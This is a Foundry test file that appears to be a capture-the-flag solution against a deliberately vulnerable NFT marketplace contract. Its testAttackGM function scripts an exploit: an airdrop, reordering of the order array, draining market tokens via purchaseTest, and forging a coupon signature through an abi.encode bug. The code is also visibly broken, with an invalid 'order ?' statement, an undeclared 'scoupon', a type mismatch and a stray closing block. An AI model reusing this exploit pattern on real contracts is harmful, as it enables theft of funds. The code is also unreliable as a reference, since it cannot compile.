// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

import "forge-std/Test.sol";

import "../src/CTF5/VulnerableMarket.sol";
import "../src/CTF5/AttackerNFT.sol";
import "../src/CTF5/Attacker.sol";

contract  VulnerableMarketTest is Test {
    VulnerableMarket internal vulnerableMarket;
    Attacker internal attacker;
    address internal player;

    uint pvk;
    Attacker internal attacker_1;
    
    struct Order {
        address nftAddress;
        uint256 tokenId;
        uint256 price;
    }

    struct Coupon {
        uint256 orderId; // Setting to 0 due to the bug (Check order of Orders)
        uint256 newprice;
        address issuer;
        address user;
        bytes reason; // Dynamically sized
    }

    struct Signature {
        uint8 v;
        bytes32[2] rs; // Statically-sized calldata
    }

    struct SignedCoupon {
        Coupon coupon;
        Signature signature;
    }

    function setUp() public {
        vm.startPrank(player);

        vulnerableMarket = new VulnerableMarket();
        attacker = new Attacker(address(vulnerableMarket));

        pvk = 12345678945613;
        // We have to get the attacker from the pvk
        attacker_1 = vm.addr(pvk);

        emit log_named_address("Attacker_1 address: ", attacker_1);

        vm.stopPrank();
    }

    function testAttack() public {
        vm.startPrank(player);

        attacker.attack();

        assertEq(vulnerableMarket.tsNFT.ownerOf(1), address(attacker));
        assertEq(vulnerableMarket.tsNFT.ownerOf(2), address(attacker));
        //assertEq(vulnerableMarket.tsNFT.ownerOf(3), address(attacker));

        vm.stopPrank();
    }

    function testAttackGM() public {
        vm.startPrank(attacker_1);

        // 1. Get ERC20 tokens
        ThreeSigmaToken token = vulnerableMarket.tsToken();
        token.airdrop(); // We get 5 tsTokens
        // Orders: [Order(1), Order(2), Order(3)]

        // NFT 2
        // 2. Create attacker NFT
        AttackerNFT aNFT = new attackerNFT();
        aNFT.mint(attacker, 1); // Mint NFT 1
        aNFT.mint(attacker, 2); // Mint NFT 2
        vulnerableMarket.createOrder(address(aNFT), 2, 1); // Dummy order, we want it to go to the beginning of the array
        // Orders: [Order(1), Order(2), Order(3), Order(aNFT-2)]

        // NFT 1
        // 3. Purchase nft 1
        token.approve(address(vulnerableMarket), type(uint).max); // Approve the market to get out tokens 
        vulnerableMarket.purchaseOrder(0);
        // Orders: [Order(aNFT-2), Order(2), Order(3)]

        ThreeSigmaNFT tsNFT = vulnerableMarket.tsNFT();

        emit log_named_address("Owner token 1: ", tsNFT.ownerOf(1));
        emit log_named_address("Owner token 2: ", tsNFT.ownerOf(2));
        emit log_named_address("Owner token 3: ", tsNFT.ownerOf(3));

        // 4. Call purchaseTest for the market to purchase our token
        //aNFT.approve(address(vulnerableMarket), 1); // Not enough, we need to let the market approve
        aNFT._setApprovalForAll(address(vulnerableMarket), true); // Set the market as an operator (He can transfer and approve to others to use)
        vulnerableMarket.purchaseTest(address(aNFT), 1, 1337); // We want all ERC20 tokens from the market
        // Orders: [Order(aNFT-2), Order(2), Order(3)]

        // 5. Use 1337 tsToken to purchase NFT 2
        vulnerableMarket.purchaseOrder(1);
        // Orders: [Order(aNFT-2), Order(3)]

        // NFT 3
        // 6. Create signed coupon
        Order memory order;
        Coupon memory coupon;
        Signature memory signature;
        SignedCoupon memory signedCoupon;

        coupon.orderId = 1;
        coupon.newprice = 1;
        coupon.issuer = attacker_1;
        coupon.user = attacker_1;
        coupon.reason = "None of your business!";
        order ? vulnerableMarket.getOrder(0);

        bytes memory serialized = abi.encode(
            "I, the issuer", coupon.issuer,
            "offer a special discount for", coupon.user,
            "to buy", order, "at", coupon.newprice,
            "because", coupon.reason
        );

        // VRS
        // vm.sign("private key", keccak256("message"))
        (signature.v, signature.rs[0], signature.rs[1]) = vm.sign(
            pvk,
            keccak256(serialized)
        );

        scoupon.coupon = coupon;
        scoupon.signature = signature;

        // 7. Call purchaseWithCoupon (Exploit abi.encode bug)
        vulnerableMarket.purchaseWithCoupon(scoupon);
    }


        vm.stopPrank();
    }

    function testCoupon() public {
        Order memory order;
        Coupon memory coupon;
        Signature memory signature;
        SignedCoupon memory signedCoupon;

        coupon.orderId = 1;
        coupon.newprice = 1;
        coupon.issuer = attacker;
        coupon.user = attacker;
        coupon.reason = "Whatever";
        
        bytes memory serialized = abi.encode(
            "I, the issuer", coupon.issuer,
            "offer a special discount for", coupon.user,
            "to buy", order, "at", coupon.newprice,
            "because", coupon.reason
        );

        // VRS
        // vm.sign("private key", keccak256("message"))
        (signature.v, signature.rs[0], signature.rs[1]) = vm.sign(
            pvk,
            keccak256(serialized)
        );

        scoupon.coupon = coupon;
        scoupon.signature = signature;

        // Call purchaseWithCoupon(scoupon)
    }
}